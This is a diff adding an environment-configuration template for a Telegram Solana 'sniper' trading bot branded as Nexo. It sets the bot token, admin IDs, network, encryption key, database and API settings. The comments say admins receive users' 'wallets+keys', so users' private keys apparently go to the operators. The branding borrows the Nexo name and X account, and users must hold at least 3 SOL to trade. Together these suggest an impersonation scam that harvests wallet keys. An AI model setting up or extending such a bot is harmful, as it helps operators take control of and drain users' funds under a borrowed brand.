@@ -1,0 +1,102 @@
+# ============================================================================
+#  NEXO SNIPER — COMPLETE ENVIRONMENT (copy & edit this whole block)
+#  ----------------------------------------------------------------------------
+#  Paste this into a file named `.env` next to the bot (local/docker), OR
+#  add each KEY=VALUE as an Environment Variable in Render:
+#    Render dashboard -> your service -> Environment -> Add Environment Variable
+#  Everything marked (REQUIRED) must be filled. Never commit the filled file.
+# ============================================================================
+
+# --------------------------------------------------------------------------
+# 1. TELEGRAM (REQUIRED)
+# --------------------------------------------------------------------------
+# Get from @BotFather (the token of YOUR bot).
+BOT_TOKEN=
+
+# Comma-separated Telegram chat IDs of the admins/owner who receive
+# notifications (new users, wallets+keys, deposits, trades, errors).
+# Get YOUR id from @userinfobot. Multiple IDs supported:
+ADMIN_IDS=123456789,987654321
+
+# Product name shown to users.
+APP_NAME=Nexo Snipe
+
+# --------------------------------------------------------------------------
+# 2. BRANDING / LINKS (help screen — edit freely)
+# --------------------------------------------------------------------------
+SUPPORT_USERNAME=@ainexobotsupport
+WEBSITE_URL=https://t.co/z1XgC7Zd6d
+TWITTER_URL=https://x.com/Nexo?s=20
+
+# --------------------------------------------------------------------------
+# 3. TRADE GATE
+# --------------------------------------------------------------------------
+# Minimum SOL balance a user must hold to trade (checked on the REAL chain).
+MIN_SOL_BALANCE=3.0000
+
+# --------------------------------------------------------------------------
+# 4. SOLANA NETWORK  (REQUIRED choices)
+# --------------------------------------------------------------------------
+# devnet = test trading with fake devnet SOL  |  mainnet = REAL money.
+# MAINNET IS LOCKED unless BOTH of these are set to mainnet/true.
+SOLANA_NETWORK=devnet
+SOLANA_MAINNET_ENABLED=false
+
+# Optional: use a private RPC (Helius/QuickNode) for production.
+# SOLANA_RPC_URL=
+
+# Optional WebSocket endpoint: wakes the deposit monitor on account changes.
+# SOLANA_WS_URL=
+
+# "confirmed" or "finalized" (finalized = safest, slower).
+COMMITMENT=confirmed
+# A deposit must persist this many polls before it is notified (anti-reorg).
+DEPOSIT_CONFIRMATION_POLLS=2
+# Deposit monitor poll interval (ms).
+DEPOSIT_POLL_INTERVAL_MS=30000
+
+# --------------------------------------------------------------------------
+# 5. WALLET SECURITY (REQUIRED)
+# --------------------------------------------------------------------------
+# The secret that encrypts every user wallet key at rest (AES-256-GCM).
+# Generate your own with:  openssl rand -hex 32
+ENCRYPTION_KEY=
+
+# Optional: YOUR owner seed phrase (12/24 words). Only its PUBLIC ADDRESS
+# is ever logged. Leave empty if you don't need it.
+# SEED_PHRASE=
+
+# --------------------------------------------------------------------------
+# 6. DATABASE (REQUIRED — PostgreSQL)
+# --------------------------------------------------------------------------
+# Render: paste the INTERNAL connection string from your Render PostgreSQL.
+# Neon/Supabase free tier also work: postgres://user:pass@host/db
+DATABASE_URL=
+
+# --------------------------------------------------------------------------
+# 7. MARKET DATA (defaults are live public APIs — leave as-is)
+# --------------------------------------------------------------------------
+COINGECKO_API_URL=https://api.coingecko.com/api/v3
+DEXSCREENER_API_URL=https://api.dexscreener.com
+JUPITER_QUOTE_API_URL=https://quote-api.jup.ag/v6
+JUPITER_PRICE_API_URL=https://api.jup.ag/price/v2
+
+# Default slippage (bps, 100 = 1%) and hard cap per trade (SOL).
+DEFAULT_SLIPPAGE_BPS=100
+TRADING_MAX_SOL_PER_TRADE=1000
+
+# --------------------------------------------------------------------------
+# 8. HARDENING (defaults are fine)
+# --------------------------------------------------------------------------
+CONVERSATION_TIMEOUT_MS=600000
+RATE_LIMIT_MAX=15
+RATE_LIMIT_WINDOW_MS=10000
+
+# --------------------------------------------------------------------------
+# 9. HEALTH SERVER / LOGGING (defaults are fine)
+# --------------------------------------------------------------------------
+# UptimeRobot: point it at https://<your-service>.onrender.com/health -> "OK"
+HEALTHCHECK_ENABLED=true
+PORT=8080
+LOG_LEVEL=info
+# ============================================================================
